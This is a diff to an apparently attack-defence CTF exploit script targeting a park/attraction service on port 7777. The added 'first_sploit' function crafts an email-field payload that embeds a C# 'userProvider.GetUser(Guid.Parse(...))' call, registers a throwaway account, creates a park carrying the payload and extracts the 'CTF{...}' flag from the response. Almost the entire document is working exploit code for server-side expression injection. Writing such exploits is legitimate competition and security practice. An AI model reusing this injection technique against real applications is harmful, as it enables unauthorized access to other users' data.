@@ -1,19 +1,39 @@
 from client import Client
-from data import get_random_creds, get_park_request
+from data import get_random_creds, get_park_request, get_random_document
 from models import RegisterRequest, AddAttractionRequest
 from pretty_client import PrettyClient
 
 
+def generate_email_payload(user_id):
+    parts = ",".join([f"(char){ord(x)}" for x in user_id])
+    guid_payload = f"Guid.Parse(new[]{{{parts}}})"
+    return f"\"hacked-by-voidhack\"@userProvider.GetUser({guid_payload})"
+
+
 def first_sploit(hostname, user_id):
-    client = PrettyClient(Client(hostname, 7777))
-    pass
+    native_client = Client(hostname, 7777)
+    client = PrettyClient(native_client)
+
+    login, password = get_random_creds()
+    register_request = RegisterRequest(login=login, password=password, document=get_random_document())
+    client.register_and_login(register_request)
+
+    create_park_request = get_park_request(False)
+    create_park_request.email = generate_email_payload(user_id)
+    park_id = client.create_park(create_park_request)
+
+    r = native_client.get_park(park_id).text
+    flag_index = r.index("CTF{")
+    flag = r[flag_index:]
+    flag = flag[:flag.index("}")+1]
+    return flag
 
 
 def second_sploit(hostname, park_id, attraction_id):
     client = PrettyClient(Client(hostname, 7777))
 
     login, password = get_random_creds()
-    register_request = RegisterRequest(login=login, password=password, document="13")
+    register_request = RegisterRequest(login=login, password=password, document=get_random_document())
     user_id = client.register_and_login(register_request)
 
     parks = client.get_last_parks()
@@ -30,7 +50,8 @@ def second_sploit(hostname, park_id, attraction_id):
 
 
 def main():
-    print(second_sploit("localhost", "d58ad940-831f-43af-977f-cc673580514c", "b8e7253c-8310-4711-b057-345defa85b5b"))
+    print(first_sploit("localhost", "ef3d89a5-37ab-4403-a9ef-9dfa36a5c83b"))
+    # print(second_sploit("localhost", "d58ad940-831f-43af-977f-cc673580514c", "b8e7253c-8310-4711-b057-345defa85b5b"))
 
 
 if __name__ == "__main__":
